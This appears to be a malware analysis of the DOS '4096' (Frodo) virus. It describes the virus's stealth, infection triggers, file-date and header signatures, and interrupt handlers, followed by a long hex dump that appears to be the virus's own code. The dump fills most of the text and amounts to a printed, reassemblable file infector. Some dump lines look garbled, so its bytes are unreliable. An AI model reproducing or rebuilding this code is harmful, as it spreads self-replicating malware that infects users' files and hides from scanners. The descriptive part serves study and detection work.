4096 Virus:

***Description:

+Will try to write a trojan boot sector on or after September 22.
    
    -Trojan writing code is garbled and can't write the sector to disk.  
     Rather, it usually hangs the computer.

+Doesn't modify the interrupt vector table, but rather patches the
 handler's first 5 bytes with a jump to Frodo's handler (for int 21 
 only!).

+When Frodo is active, it is unable to be found by F-Prot, and probably
 other virus scanners (EXCEPT FOR THE MEMORY SCAN!).

+When Frodo is active and CHKDSK is run, it reports allocation errors
 because the number of clusters for infected files isn't the same as their
 lengths.

+Frodo will try to infect a file when it is closed using a handle or when
 it is run.

+The way Frodo works, a file could be created by a compiler, and right
 when it is closed, it will be infected!  EVERYTHING is at risk.
    -A virus scanner that opens every file could infect a whole hard disk!

+Frodo will NOT infect files with the Read Only, Hidden, and System
 attributes set.  This means that the important DOS kernel files won't be
 infected.


***Signatures:

+Increases each infected file's date by 100 years, but hides this when
 DOS functions return the date.

+In COM files, Frodo sets up the first 3 words so that when they are
 added together then the sum is zero.

+In EXE files, Frodo sets up the EXE header so that the original IP
 is 0001.

+The only way to see these changes to the files is to use the BIOS disk
 routines or DOS absolute read/write routines and look directly at the
 directory structure to find infected files.


***Int 1 handler:

+Frodo's int 1 handler is to keep debuggers or other checkers from screening
 out questionable DOS or BIOS activities.

+The routine responds differently according to a flag at CS:[1250].

    -If the flag equals 0 or 2 then the int 1 handler has been set up by
     either the procedure starting at 0DE6 or the lines 0232 to 0235.  The
     address and offset (on the stack) of the interrupted handler, which is 
     the ACTUAL handler (not some TSR), are both saved in Frodo's memory.

        ;If the flag equals 0 then the int 1 handler turns itself off right
         when the REAL handler is reached and, after saving its address, 
         irets to the handler that was interrupted.

        ;If the flag equals 2 then the int 1 handler turns itself off right
         when the REAL handler is reached and, after saving its address, 
         restores the SS and SP pointing to Frodo's stack and jumps to the 
         end of the procedure starting at 0DE6.

    -If the flag equals 1 then the int 1 handler has been set up by Frodo's
     int 21 handler.  The int 1 code remains basically inactive until the
     ORIGINAL (not some TSR) int 21 is being jumped to by Frodo.  Then it 
     counts down for the next four instructions, and after that it replaces 
     the first part of the real int 21 with its own jump.  That way the real
     int 21 executes intact, but Frodo still has its jump put in place.


***Int 13 handler:

+Frodo's int 13 handler has only the function of keeping track of any critical
 errors that might have occurred during the int 13 call.


HEX Dump:

0100  E9 85 02 6E 15 0C 63 74-65 64 20 50 72 6F 67 72  i..n..cted Progr
0110  61 6D 2E 20 0D 0A 24 BA-02 01 B4 09 CD 21 CD 20  am. ..$:..4.M!M
0120  00 E9 A7 00 EB 15 49 6E-66 65 63 74 65 64 20 50  .i'.k.Infected P
0130  72 6F 67 72 61 6D 2E 20-0D 0A 24 BA 02 01 B4 09  rogram. ..$:..4.
0140  00 FE 3A 55 8B EC 50 81-7E 04 00 C0 73 0C 2E A1  .~:U.lP.~..@s..!
0150  47 12 39 46 04 76 03 58-5D CF 2E 80 3E 50 12 01  G.9F.v.X]O..>P..
0160  74 32 8B 46 04 2E A3 2F-12 8B 46 02 2E A3 2D 12  t2.F..#/..F..#-.
0170  72 15 58 5D 2E 8E 16 DD-12 2E 8B 26 DF 12 2E A0  r.X]...]...&_..
0180  E5 12 E6 21 E9 D9 0C 81-66 06 FF FE 2E A0 E5 12  e.f!iY..f..~. e.
0190  E6 21 EB C3 2E FE 0E 51-12 75 BC 81 66 06 FF FE  f!kC.~.Q.u<.f..~
01A0  E8 6C 0D E8 34 0D 2E C5-16 31 12 B0 01 E8 0C 0F  hl.h4..E.1.0.h..
01B0  E8 53 0D EB D2 1E 56 33-F6 8E DE 32 E4 8B F0 D1  hS.kR.V3v.^2d.pQ
01C0  E6 D1 E6 8B 1C 8E 44 02-5E 1F C3 2E C7 06 5B 13  fQf...D.^.C.G.[.
01D0  00 16 2E A3 E3 12 B4 30-CD 21 2E A2 EE 12 2E 8C  ...#c.40M!."n...
01E0  1E 45 12 B4 52 CD 21 26-8B 47 FE 2E A3 47 12 8E  .E.4RM!&.G~.#G..
01F0  C0 26 A1 01 00 2E A3 49-12 0E 1F B0 01 E8 B5 FF  @&!...#I...0.h5.
0200  89 1E 31 12 8C 06 33 12-B0 21 E8 A8 FF 89 1E 2D  ..1...3.0!h(...-
0210  12 8C 06 2F 12 C6 06 50-12 00 BA 23 00 B0 01 E8  .../.F.P..:#.0.h
0220  9A 0E 9C 58 0D 00 01 50-E4 21 A2 E5 12 B0 FF E6  ...X...Pd!"e.0.f
0230  21 9D B4 52 9C FF 1E 2D-12 9C 58 25 FF FE 50 9D  !.4R...-..X%.~P.
0240  A0 E5 12 E6 21 1E C5 16-31 12 B0 01 E8 6D 0E 1F   e.f!.E.1.0.hm..
0250  C4 3E 2D 12 89 3E 35 12-8C 06 37 12 C6 06 4B 12  D>-..>5...7.F.K.
0260  EA C7 06 4C 12 CC 02 8C-0E 4E 12 E8 6C 0C B8 00  jG.L.L...N.hl.8.
0270  4B 88 26 E2 12 BA 21 00-FF 36 20 00 CD 21 8F 06  K.&b.:!..6 .M!..
0280  20 00 26 83 45 FC 09 90-8E 06 45 12 8E 1E 45 12   .&.E|....E...E.
0290  81 2E 02 00 61 01 8B 2E-02 00 8C DA 2B EA B4 4A  ....a......Z+j4J
02A0  BB FF FF CD 21 B4 4A CD-21 4A 8E DA 80 3E 00 00  ;..M!4JM!J.Z.>..
02B0  5A 74 05 2E FE 0E E2 12-2E 80 3E E2 12 00 74 05  Zt..~.b...>b..t.
02C0  C6 06 00 00 4D A1 03 00-8B D8 2D 61 01 03 D0 A3  F...M!...X-a..P#
02D0  03 00 42 8E C2 26 C6 06-00 00 5A 2E FF 36 49 12  ..B.B&F...Z..6I.
02E0  26 8F 06 01 00 26 C7 06-03 00 60 01 42 8E C2 0E  &....&G...`.B.B.
02F0  1F B9 00 0B BE FE 15 8B-FE FD F3 A5 FC 06 B8 EE  .9..>~..~}s%|.8n
0300  01 50 2E 8E 06 45 12 B4-4A 8B DD CD 21 CB E8 C9  .P...E.4J.]M!KhI
0310  0B 2E 8C 0E 4E 12 E8 C1-0B 0E 1F C6 06 A2 12 14  ....N.hA...F."..
0320  0E 07 BF 52 12 B9 14 00-33 C0 F3 AB A2 EF 12 A1  ..?R.9..3@s+"o.!
0330  45 12 8E C0 26 C5 16 0A-00 8E D8 05 10 00 2E 01  E..@&E....X.....
0340  06 1A 00 2E 80 3E 20 00-00 75 24 FB 2E A1 04 00  .....> ..u${.!..
0350  A3 00 01 2E A1 06 00 A3-02 01 2E A1 08 00 A3 04  #...!..#...!..#.
0360  01 2E FF 36 45 12 B8 00-01 50 2E A1 E3 12 CB 2E  ...6E.8..P.!c.K.
0370  01 06 12 00 2E A1 E3 12-2E 8E 16 12 00 2E 8B 26  .....!c........&
0380  14 00 FB 2E FF 2E 18 00-81 FC 00 01 77 02 33 E4  ..{......|..w.3d
0390  8B E8 E8 00 00 59 81 E9-75 02 8C C8 BB 10 00 F7  .hh..Y.iu..H;..w
03A0  E3 03 C1 83 D2 00 F7 F3-50 B8 AB 00 50 8B C5 CB  c.A.R.wsP8+.P.EK
03B0  30 7C 07 23 4E 04 37 8B-0E 4B 8B 05 3C D5 04 3D  0|.#N.7..K..U.....M.!A.'?
03D0  03 11 59 03 12 59 03 4E-9F 04 4F 9F 04 3F A5 0A  ..Y..Y.N..O..?%.
03E0  40 8A 0B 42 90 0A 57 41-0A 48 34 0E 3D 00 4B 75  @..B..WA.H4.=.Ku
03F0  04 2E A2 E2 12 55 8B EC-FF 76 06 2E 8F 06 B3 12  .."b.U.l.v....3.
0400  5D 55 8B EC E8 08 0B E8-D0 0A E8 9A 0A E8 F6 0A  ]U.lh..hP.h..hv.
0410  E8 B4 0A 53 BB 90 02 2E-3A 27 75 09 2E 8B 5F 01  h4.S;...:'u..._.
0420  87 5E EC FC C3 83 C3 03-81 FB CC 02 72 E9 5B E8  .^l|C.C..{L.ri[h
0430  89 0A E4 21 2E A2 E5 12-B0 FF E6 21 2E C6 06 51  ..d!."e.0.f!.F.Q
0440  12 04 2E C6 06 50 12 01-E8 F1 0A E8 A5 0A 50 2E  ...F.P..hq.h%.P.
0450  A1 B3 12 0D 00 01 50 9D-58 5D 2E FF 2E 35 12 E8  !3....P.X]...5.h
0460  AD 0A E8 56 0A E8 72 0A-E8 9B 0A 5D 55 8B EC 2E  -.hV.hr.h..]U.l.
0470  FF 36 B3 12 8F 46 06 5D-CF E8 77 0A E8 35 0B 0A  .63..F.]Ohw.h5..
0480  C0 75 DC E8 41 0A E8 18-02 B0 00 80 3F FF 75 06  @u\hA.h..0..?.u.
0490  8A 47 06 83 C3 07 2E 20-06 F0 12 F6 47 1A 80 74  .G..C.. .p.vG..t
04A0  15 80 6F 1A C8 2E 80 3E-F0 12 00 75 09 81 6F 1D  ..o.H..>p..u..o.
04B0  00 10 83 5F 1F 00 E8 3A-0A EB A4 E8 35 0A E8 F3  ..._..h:.k$h5.hs
04C0  0A E8 03 0A 0A C0 75 EE-8B DA F6 47 15 80 74 E6  .h...@un.ZvG..tf
04D0  80 6F 15 C8 81 6F 10 00-10 80 5F 12 00 EB D7 E3  .o.H.o...._..kWc
04E0  1B 8B DA 8B 77 21 0B 77-23 75 11 EB 0A 8B DA 8B  ..Z.w!.w#u.k..Z.
04F0  47 0C 0A 47 20 75 05 E8-3F 05 73 03 E9 30 FF E8  G..G u.h?.s.i0.h
0500  F1 09 E8 C2 09 E8 AC 0A-89 46 FC 89 4E F8 1E 52  q.hB.h,..F|.Nx.R
0510  E8 8E 01 83 7F 14 01 74-0F 8B 07 03 47 02 03 47  h......t....G..G
0520  04 74 05 83 C4 04 EB 8E-5A 1F 8B F2 0E 07 BF B5  .t..D.k.Z..r..?5
0530  12 B9 25 00 F3 A4 BF B5-12 0E 1F 8B 45 10 8B 55  .9%.s$?5....E..U
0540  12 05 0F 10 83 D2 00 25-F0 FF 89 45 10 89 55 12  .....R.%p..E..U.
0550  2D FC 0F 83 DA 00 89 45-21 89 55 23 C7 45 0E 01  -|..Z..E!.U#GE..
0560  00 B9 1C 00 8B D7 B4 27-E8 49 0A E9 48 FF 0E 07  .9...W4'hI.iH...
0570  8B F2 BF B5 12 B9 25 00-F3 A4 1E 52 0E 1F BA B5  .r?5.9%.s$.R..:5
0580  12 B4 0F E8 2E 0A B4 10-E8 29 0A F6 06 CA 12 80  .4.h..4.h).v.J..
0590  5E 1F 74 7E 2E C4 1E C5-12 8C C0 81 EB 00 10 1D  ^.t~.D.E..@.k...
05A0  00 00 33 D2 2E 8B 0E C3-12 49 03 D9 15 00 00 41  ..3R...C.I.Y...A
05B0  F7 F1 89 44 23 92 93 F7-F1 89 44 21 E9 F7 FE 2E  wq.D#..wq.D!iw~.
05C0  83 26 B3 12 FE E8 2B 09-E8 E9 09 E8 F9 08 73 09  .&3.~h+.hi.hy.s.
05D0  2E 83 0E B3 12 01 E9 DD-FE E8 C5 00 F6 47 19 80  ...3..i]~hE.vG..
05E0  75 03 E9 D1 FE 81 6F 1A-00 10 83 5F 1C 00 80 6F  u.iQ~.o...._...o
05F0  19 C8 E9 C1 FE 51 83 E1-07 83 F9 07 74 2F 59 E8  .HiA~Q.a..y.t/Yh
0600  E4 07 E8 AF 09 E8 84 08-9C 2E 80 3E DA 12 00 74  d.h/.h.....>Z..t
0610  04 9D E9 1A FE 9D 72 09-8B D8 B4 3E E8 95 09 EB  ..i.~.r..X4>h..k
0620  10 2E 80 0E B3 12 01 89-46 FC E9 89 FE 59 E9 FE  ....3...F|i.~Yi~
0630  FD E8 5D 04 E8 0E 04 72-39 2E 80 3E A2 12 00 74  }h].h..r9..>"..t
0640  31 E8 5A 04 83 FB FF 74-29 2E FE 0E A2 12 0E 07  1hZ..{.t).~."...
0650  BF 52 12 B9 14 00 33 C0-F2 AF 2E A1 A3 12 26 89  ?R.9..3@r/.!#.&.
0660  45 FE 26 89 5D 26 89 5E-FC 2E 80 26 B3 12 FE E9  E~&.]&.^|..&3.~i
0670  44 FE E9 BA FD 0E 07 E8-17 04 BF 52 12 B9 14 00  D~i:}..h..?R.9..
0680  2E A1 A3 12 F2 AF 75 16-26 3B 5D 26 75 F6 26 C7  .!#.r/u.&;]&uv&G
0690  45 FE 00 00 E8 1C 02 2E-FE 06 A2 12 EB CB E9 8E  E~..h...~.".kKi.
06A0  FD 06 B4 2F E8 0D 09 06-1F 07 C3 0A C0 74 03 E9  }.4/h.....C.@t.i
06B0  4E 01 1E 52 2E 89 1E 24-12 2E 8C 06 26 12 2E C5  N..R...$....&..E
06C0  36 24 12 BF F1 12 B9 0E-00 0E 07 F3 A4 5E 1F BF  6$.?q.9....s$^.?
06D0  07 13 B9 50 00 F3 A4 BB-FF FF E8 7D 08 E8 13 08  ..9P.s$;..h}.h..
06E0  5D 2E 8F 06 E6 12 2E 8F-06 E8 12 2E 8F 06 B3 12  ]...f....h....3.
06F0  B8 01 4B 0E 07 BB F1 12-9C 2E FF 1E 35 12 73 20  8.K..;q.....5.s
0700  2E 83 0E B3 12 01 2E FF-36 B3 12 2E FF 36 E8 12  ...3....63...6h.
0710  2E FF 36 E6 12 55 8B EC-2E C4 1E 24 12 E9 3F FD  ..6f.U.l.D.$.i?}
0720  E8 6E 03 0E 07 BF 52 12-B9 14 00 2E A1 A3 12 F2  hn...?R.9...!#.r
0730  AF 75 0D 26 C7 45 FE 00-00 2E FE 06 A2 12 EB EB  /u.&GE~...~.".kk
0740  2E C5 36 03 13 83 FE 01-75 33 8B 16 1A 00 83 C2  .E6...~.u3.....B
0750  10 B4 51 E8 5E 08 03 D3-2E 89 16 05 13 FF 36 18  .4Qh^..S......6.
0760  00 2E 8F 06 03 13 83 C3-10 03 1E 12 00 2E 89 1E  .......C........
0770  01 13 FF 36 14 00 2E 8F-06 FF 12 EB 22 8B 04 03  ...6.......k"...
0780  44 02 03 44 04 74 60 0E-1F BA 07 13 E8 B6 02 E8  D..D.t`..:..h6.h
0790  0C 03 2E FE 06 EF 12 E8-19 01 2E FE 0E EF 12 B4  ...~.o.h...~.o.4
07A0  51 E8 10 08 E8 68 07 E8-11 07 E8 2D 07 E8 56 07  Qh..hh.h..h-.hV.
07B0  8E DB 8E C3 2E FF 36 B3-12 2E FF 36 E8 12 2E FF  .[.C..63...6h...
07C0  36 E6 12 8F 06 0A 00 8F-06 0C 00 1E C5 16 0A 00  6f..........E...
07D0  B0 22 E8 E7 08 1F 9D 58-2E 8E 16 01 13 2E 8B 26  0"hg...X.......&
07E0  FF 12 2E FF 2E 03 13 8B-5C 01 8B 80 9F FD 89 04  ........\....}..
07F0  8B 80 A1 FD 89 44 02 8B-80 A3 FD 89 44 04 EB 9F  ..!}.D...#}.D.k.
0800  3C 01 74 03 E9 28 FC 2E-83 0E B3 12 01 2E 89 1E  <.t.i(|...3.....
0810  24 12 2E 8C 06 26 12 E8-D9 06 E8 97 07 E8 A7 06  $....&.hY.h..h'.
0820  2E C4 1E 24 12 26 C5 77-12 72 6E 2E 80 26 B3 12  .D.$.&Ew.rn..&3.
0830  FE 83 FE 01 74 23 8B 04-03 44 02 03 44 04 75 45  ~.~.t#...D..D.uE
0840  8B 5C 01 8B 80 9F FD 89-04 8B 80 A1 FD 89 44 02  .\....}....!}.D.
0850  8B 80 A3 FD 89 44 04 EB-2C 8B 16 1A 00 E8 31 02  ..#}.D.k,....h1.
0860  2E 8B 0E A3 12 83 C1 10-03 D1 26 89 57 14 A1 18  ...#..A..Q&.W.!.
0870  00 26 89 47 12 A1 12 00-03 C1 26 89 47 10 A1 14  .&.G.!...A&.G.!.
0880  00 26 89 47 0E E8 09 02-2E 8E 1E A3 12 8B 46 02  .&.G.h.....#..F.
0890  A3 0A 00 8B 46 04 A3 0C-00 E9 1A FC 2E C6 06 F0  #...F.#..i.|.F.p
08A0  12 00 B4 2A E8 0D 07 81-FA 16 09 72 03 E8 22 08  ..4*h...z..r.h".
08B0  E9 7C FB E8 30 05 E8 BC-00 C6 06 20 00 01 81 3E  i|{h0.h<.F. ...>
08C0  00 12 4D 5A 74 0E 81 3E-00 12 5A 4D 74 06 FE 0E  ..MZt..>..ZMt.~.
08D0  20 00 74 58 A1 04 12 D1-E1 F7 E1 05 00 02 3B C6   .tX!..Qawa...;F
08E0  72 48 A1 0A 12 0B 06 0C-12 74 3F A1 A9 12 8B 16  rH!......t?!)...
08F0  AB 12 B9 00 02 F7 F1 0B-D2 74 01 40 A3 04 12 89  +.9..wq.Rt.@#...
0900  16 02 12 83 3E 14 12 01-74 62 C7 06 14 12 01 00  ....>...tbG.....
0910  8B C6 2B 06 08 12 A3 16-12 83 06 04 12 08 A3 0E  .F+...#.......#.
0920  12 C7 06 10 12 00 10 E8-A9 00 EB 40 81 FE 00 0F  .G.....h).k@.~..
0930  73 3A A1 00 12 A3 04 00-03 D0 A1 02 12 A3 06 00  s:!..#...P!..#..
0940  03 D0 A1 04 12 A3 08 00-03 D0 74 20 B1 E9 88 0E  .P!..#...Pt 1i..
0950  00 12 B8 10 00 F7 E6 05-65 02 A3 01 12 A1 00 12  ..8..wf.e.#..!..
0960  03 06 02 12 F7 D8 A3 04-12 E8 67 00 B4 3E E8 43  ....wX#..hg.4>hC
0970  06 E8 18 05 C3 0E 1F B8-00 57 E8 37 06 89 0E 29  .h..C..8.Wh7...)
0980  12 89 16 2B 12 B8 00 42-33 C9 8B D1 E8 25 06 B4  ...+.8.B3I.Qh%.4
0990  3F B1 1C BA 00 12 E8 1B-06 B8 00 42 33 C9 8B D1  ?1.:..h..8.B3I.Q
09A0  E8 11 06 B4 3F B1 1C BA-04 00 E8 07 06 B8 02 42  h..4?1.:..h..8.B
09B0  33 C9 8B D1 E8 FD 05 A3-A9 12 89 16 AB 12 8B F8  3I.Qh}.#)...+..x
09C0  05 0F 00 83 D2 00 25 F0-FF 2B F8 B9 10 00 F7 F1  ....R.%p.+x9..wq
09D0  8B F0 C3 B8 00 42 33 C9-8B D1 E8 D7 05 B4 40 B1  .pC8.B3I.QhW.4@1
09E0  1C BA 00 12 E8 CD 05 B8-10 00 F7 E6 8B CA 8B D0  .:..hM.8..wf.J.P
09F0  B8 00 42 E8 BE 05 33 D2-B9 00 10 03 CF B4 40 E8  8.Bh>.3R9...O4@h
0A00  B2 05 B8 01 57 8B 0E 29-12 8B 16 2B 12 F6 C6 80  2.8.W..)...+.vF.
0A10  75 03 80 C6 C8 E8 9C 05-80 3E EE 12 03 72 19 80  u..FHh...>n..r..
0A20  3E EF 12 00 74 12 53 8A-16 28 12 B4 32 E8 84 05  >o..t.S..(.42h..
0A30  2E A1 EC 12 89 47 1E 5B-C3 E8 D3 04 8B FA 83 C7  .!l..G.[ChS..z.G
0A40  0D 1E 07 EB 20 E8 C7 04-1E 07 8B FA B9 50 00 33  ...k hG....z9P.3
0A50  C0 B3 00 80 7D 01 3A 75-05 8A 1D 80 E3 1F 2E 88  @3..}.:u....c...
0A60  1E 28 12 F2 AE 8B 45 FD-25 DF DF 02 E0 8A 45 FC  .(.r..E}%__.`.E|
0A70  24 DF 02 C4 2E C6 06 20-00 00 3C DF 74 09 2E FE  $_.D.F. ..<_t..~
0A80  06 20 00 3C E2 75 05 E8-7C 04 F8 C3 E8 77 04 F9  . .Z..u)8.=hX.r!.X
0AE0  8B CF B8 01 43 E8 CC 04-53 2E 8A 16 28 12 B4 32  .O8.ChL.S...(.42
0AF0  E8 C1 04 8B 47 1E 2E A3-EC 12 5B E8 8E 03 C3 33  hA..G..#l.[h..C3
0B00  DB 4B E8 87 03 C3 51 52-50 B8 00 44 E8 A5 04 80  [Kh..CQRP8.Dh%..
0B10  F2 80 F6 C2 80 74 09 B8-00 57 E8 97 04 F6 C6 80  r.vB.t.8.Wh..vF.
0B20  58 5A 59 C3 E8 E8 03 B8-01 42 33 C9 33 D2 E8 83  XZYChh.8.B3I3Rh.
0B30  04 2E A3 A5 12 2E 89 16-A7 12 B8 02 42 33 C9 33  ..#%....'.8.B3I3
0B40  D2 E8 70 04 2E A3 A9 12-2E 89 16 AB 12 B8 00 42  Rhp..#)....+.8.B
0B50  2E 8B 16 A5 12 2E 8B 0E-A7 12 E8 57 04 E8 A6 03  ...%....'.hW.h&.
0B60  C3 0A C0 75 22 2E 83 26-B3 12 FE E8 85 03 E8 43  C.@u"..&3.~h..hC
0B70  04 72 0B F6 C6 80 74 03-80 EE C8 E9 E1 F8 2E 83  .r.vF.t..nHiax..
0B80  0E B3 12 01 E9 D8 F8 3C-01 75 37 2E 83 26 B3 12  .3..iXx<.u7..&3.
0B90  FE F6 C6 80 74 03 80 EE-C8 E8 6A FF 74 03 80 C6  ~vF.t..nHhj.t..F
0BA0  C8 E8 10 04 89 46 FC 2E-83 16 B3 12 00 E9 06 F9  Hh...F|...3..i.y
0BB0  3C 02 75 0E E8 4F FF 74-09 81 6E F6 00 10 83 5E  <.u.hO.t..nv...^
0BC0  F8 00 E9 6A F8 2E 80 26-B3 12 FE E8 38 FF 74 F2  x.ijx..&3.~h8.tr
0BD0  2E 89 0E AF 12 2E 89 16-AD 12 2E C7 06 B1 12 00  .../....-..G.1..
0BE0  00 E8 40 FF 2E A1 A9 12-2E 8B 16 AB 12 2D 00 10  .h@..!)....+.-..
0BF0  83 DA 00 2E 2B 06 A5 12-2E 1B 16 A7 12 79 08 C7  .Z..+.%....'.y.G
0C00  46 FC 00 00 E9 62 FA 75-08 3B C1 77 04 2E A3 AF  F|..ibzu.;Aw..#/
0C10  12 2E 8B 16 A5 12 2E 8B-0E A7 12 0B C9 75 05 83  ....%....'..Iu..
0C20  FA 1C 76 1A 2E 8B 16 AD-12 2E 8B 0E AF 12 B4 3F  z.v....-..../.4?
0C30  E8 81 03 2E 03 06 B1 12-89 46 FC E9 78 F8 8B F2  h.....1..F|ixx.r
0C40  8B FA 2E 03 3E AF 12 83-FF 1C 72 04 33 FF EB 05  .z..>/....r.3.k.
0C50  83 EF 1C F7 DF 8B C2 2E-8B 0E AB 12 2E 8B 16 A9  .o.w_.B...+....)
0C60  12 83 C2 0F 83 D1 00 83-E2 F0 81 EA FC 0F 83 D9  ..B..Q..bp.j|..Y
0C70  00 03 D0 83 D1 00 B8 00-42 E8 38 03 B9 1C 00 2B  ..P.Q.8.Bh8.9..+
0C80  CF 2B CE B4 3F 2E 8B 16-AD 12 E8 27 03 2E 01 06  O+N4?...-.h'....
0C90  AD 12 2E 29 06 AF 12 2E-01 06 B1 12 33 C9 BA 1C  -..)./....1.3I:.
0CA0  00 B8 00 42 E8 0D 03 E9-7A FF 2E 80 26 B3 12 FE  .8.Bh..iz...&3.~
0CB0  E8 53 FE 75 03 E9 0A FF-2E 89 0E AF 12 2E 89 16  hS~u.i...../....
0CC0  AD 12 2E C7 06 B1 12 00-00 E8 58 FE 2E A1 A9 12  -..G.1...hX~.!).
0CD0  2E 8B 16 AB 12 2D 00 10-83 DA 00 2E 2B 06 A5 12  ...+.-...Z..+.%.
0CE0  2E 1B 16 A7 12 78 02 EB-7E E8 FA 00 0E 1F 8B 16  ...'.x.k~hz.....
0CF0  A9 12 8B 0E AB 12 83 C2-0F 83 D1 00 83 E2 F0 81  )...+..B..Q..bp.
0D00  EA FC 0F 83 D9 00 B8 00-42 E8 A8 02 BA 04 00 B9  j|..Y.8.Bh(.:..9
0D10  1C 00 B4 3F E8 9D 02 B8-00 42 33 C9 8B D1 E8 93  ..4?h..8.B3I.Qh.
0D20  02 BA 04 00 B9 1C 00 B4-40 E8 88 02 BA 00 F0 B9  .:..9..4@h..:.p9
0D30  FF FF B8 02 42 E8 7C 02-B4 40 33 C9 E8 75 02 8B  ..8.Bh|.4@3Ihu..
0D40  16 A5 12 8B 0E A7 12 B8-00 42 E8 67 02 B8 00 57  .%...'.8.Bhg.8.W
0D50  E8 61 02 F6 C6 80 74 09-80 EE C8 B8 01 57 E8 53  ha.vF.t..nH8.WhS
0D60  02 E8 28 01 E9 C8 F6 75-07 3B C1 77 03 E9 79 FF  .h(.iHvu.;Aw.iy.
0D70  2E 8B 16 A5 12 2E 8B 0E-A7 12 0B C9 75 08 83 FA  ...%....'..Iu..z
0D80  1C 77 03 E9 63 FF E8 6A-01 E8 28 02 E8 38 01 B8  .w.ic.hj.h(.h8.8
0D90  00 57 E8 1F 02 F6 C6 80-75 09 80 C6 C8 B8 01 57  .Wh..vF.u..FH8.W
0DA0  E8 11 02 E9 10 F7 E9 86-F6 2E 8F 06 41 12 2E 8F  h..i.wi.v...A...
0DB0  06 43 12 2E 8F 06 DB 12-2E 83 26 DB 12 FE 2E 80  .C....[...&[.~..
0DC0  3E DA 12 00 75 11 2E FF-36 DB 12 2E FF 1E 2D 12  >Z..u...6[....-.
0DD0  73 06 2E FE 06 DA 12 F9-2E FF 2E 41 12 32 C0 2E  s..~.Z.y...A.2@.
0DE0  C6 06 DA 12 01 CF 2E C6-06 DA 12 00 E8 20 01 0E  F.Z..O.F.Z..h ..
0DF0  1F B0 13 E8 BF F3 89 1E-2D 12 8C 06 2F 12 89 1E  .0.h?s..-.../...
0E00  39 12 8C 06 3B 12 B2 00-B0 0D E8 A8 F3 8C C0 3D  9...;.2.0.h(s.@=
0E10  00 C0 73 02 B2 02 B0 0E-E8 9A F3 8C C0 3D 00 C0  .@s.2.0.h.s.@=.@
0E20  73 02 B2 02 88 16 50 12-E8 11 01 8C 16 DD 12 89  s.2...P.h....]..
0E30  26 DF 12 0E B8 40 0D 50-B8 70 00 8E C0 B9 FF FF  &_..8@.P8p..@9..
0E40  B0 CB 33 FF F2 AE 4F 9C-06 57 9C 58 80 CC 01 50  0K3.r.O..W.X.L.P
0E50  E4 21 A2 E5 12 B0 FF E6-21 9D 33 C0 FF 2E 2D 12  d!"e.0.f!.3@..-.
0E60  C5 16 31 12 B0 01 E8 53-02 0E 1F BA 89 0C B0 13  E.1.0.hS...:..0.
0E70  E8 49 02 B0 24 E8 3D F3-89 1E 3D 12 8C 06 3F 12  hI.0$h=s..=...?.
0E80  BA BD 0C B0 24 E8 34 02-E8 7B 00 C3 E8 80 00 2E  :=.0$h4.h{.Ch...
0E90  C5 16 39 12 B0 13 E8 23-02 2E C5 16 3D 12 B0 24  E.9.0.h#..E.=.0$
0EA0  E8 19 02 E8 60 00 C3 B8-00 33 E8 07 01 2E 88 16  h..h`.C8.3h.....
0EB0  E1 12 B8 01 33 32 D2 E8-FA 00 C3 2E 8A 16 E1 12  a.8.32Rhz.C...a.
0EC0  B8 01 33 E8 EE 00 C3 2E-8F 06 EA 12 9C 50 53 51  8.3hn.C...j..PSQ
0ED0  52 56 57 1E 06 2E FF 26-EA 12 2E C4 3E 35 12 BE  RVW....&j..D>5.>
0EE0  4B 12 0E 1F FC B9 05 00-AC 26 86 05 88 44 FF 47  K...|9..,&...D.G
0EF0  E2 F6 C3 2E 8F 06 EA 12-07 1F 5F 5E 5A 59 5B 58  bvC...j..._^ZY[X
0F00  9D 2E FF 26 EA 12 2E C7-06 5D 13 D3 0D EB 07 2E  ...&j..G.].S.k..
0F10  C7 06 5D 13 A7 0D 2E 8C-16 59 13 2E 89 26 57 13  G.].'....Y...&W.
0F20  0E 17 2E 8B 26 5B 13 2E-FF 16 5D 13 2E 89 26 5B  ....&[....]...&[
0F30  13 2E 8E 16 59 13 2E 8B-26 57 13 C3 B0 01 E8 74  ....Y...&W.C0.ht
0F40  F2 2E 89 1E 31 12 2E 8C-06 33 12 0E 1F BA 23 00  r...1....3...:#.
0F50  E8 69 01 C3 E8 03 00 E9-D5 F4 2E 80 3E E2 12 00  hi.Ch..iUt..>b..
0F60  74 48 83 FB FF 75 43 BB-60 01 E8 47 00 72 3B 8C  tH.{.uC;`.hG.r;.
0F70  CA 3B C2 72 09 8E C0 B4-49 E8 38 00 EB 2C 4A 8E  J;Br..@4Ih8.k,J.
0F80  DA C7 06 01 00 00 00 42-8E DA 8E C0 50 2E A3 4E  ZG.....B.Z.@P.#N
0F90  12 33 F6 8B FE B9 00 0B-F3 A5 48 8E C0 2E A1 49  .3v.~9..s%H.@.!I
0FA0  12 26 A3 01 00 B8 8A 0E-50 CB C3 2E C6 06 F0 12  .&#..8..PKC.F.p.
0FB0  02 E9 7B F4 9C 2E FF 1E-35 12 C3 FA 33 C0 8E D0  .i{t....5.Cz3@.P
0FC0  BC 00 7C EB 4F DB DB DB-20 F9 E0 E3 C3 80 81 11  <.|kO[[[ y`cC...
0FD0  12 24 40 81 11 12 24 40-F1 F1 12 24 40 81 21 12  .$@...$@qq.$@.!.
0FE0  24 40 81 10 E3 C3 80 00-00 00 00 00 00 00 00 00  $@..cC..........
0FF0  00 82 44 F8 70 C0 82 44-80 88 C0 82 44 80 80 C0  ..Dxp@.D..@.D..@
1000  82 44 F0 70 C0 82 28 80-08 C0 82 28 80 88 00 F2  .Dpp@.(..@.(...r
1010  10 F8 70 C0 0E 1F BA 00-B0 B4 0F CD 10 3C 07 74  .xp@..:.04.M.<.t
1020  03 BA 00 B8 8E C2 FC 33-FF B9 D0 07 B8 20 07 F3  .:.8.B|3.9P.8 .s
1030  AB BE 0E 7C BB AE 02 BD-05 00 8B FB AC 8A F0 B9  +>.|;..=...{,.p9
1040  08 00 B8 20 07 D1 E2 73-02 B0 DB AB E2 F4 4D 75  ..8 .Qbs.0[+btMu
1050  EB 81 C3 A0 00 81 FE 59-7C 72 DC B4 01 CD 10 B0  k.C ..~Y|r\4.M.0
1060  08 BA B9 7C E8 55 00 B8-FE 07 E6 21 FB 33 DB B9  .:9|hU.8~.f!{3[9
1070  01 00 EB FE 49 75 0B 33-FF 43 E8 0A 00 E8 07 00  ..k~Iu.3.Ch..h..
1080  B1 04 B0 20 E6 20 CF B9-28 00 E8 26 00 AB AB E2  1.0 f O9(.h&.++b
1090  F9 81 C7 9E 00 B9 17 00-E8 18 00 AB 81 C7 9E 00  y.G..9..h..+.G..
